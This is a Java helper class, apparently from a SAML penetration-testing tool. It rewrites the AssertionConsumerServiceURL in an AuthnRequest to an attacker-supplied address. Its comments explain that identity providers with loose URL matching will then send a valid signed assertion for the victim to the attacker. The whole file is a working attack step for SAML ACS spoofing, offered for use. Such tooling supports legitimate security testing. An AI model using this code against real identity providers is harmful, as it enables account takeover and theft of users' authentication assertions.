package helpers;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import java.io.IOException;

/// Rewrites the AssertionConsumerServiceURL on an AuthnRequest so the IdP's
/// response is delivered to an attacker-controlled endpoint.
///
/// Useful against IdPs that do not enforce an exact match against the SP's
/// registered ACS (e.g. substring or regex comparison, missing comparison,
/// or looser "allow any URL from same origin" logic). If the target IdP is
/// mis-configured, the resulting SAMLResponse lands at the attacker, leaking
/// a valid signed assertion for the victim user.
///
/// Reference: https://web-in-security.blogspot.com/2015/04/on-security-of-saml-based-identity.html
public class ACSSpoof {

    public static String apply(String samlMessage, String attackerUrl)
            throws SAXException, IOException {
        if (attackerUrl == null || attackerUrl.isBlank()) {
            throw new IllegalArgumentException("Attacker URL must not be empty.");
        }

        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        NodeList requests = document.getElementsByTagNameNS("*", "AuthnRequest");
        if (requests.getLength() == 0) {
            throw new IllegalArgumentException(
                    "No AuthnRequest element found — this helper only rewrites SAMLRequest messages.");
        }

        Element authnRequest = (Element) requests.item(0);
        authnRequest.setAttribute("AssertionConsumerServiceURL", attackerUrl);

        return xmlHelpers.getString(document);
    }

    private ACSSpoof() {}
}
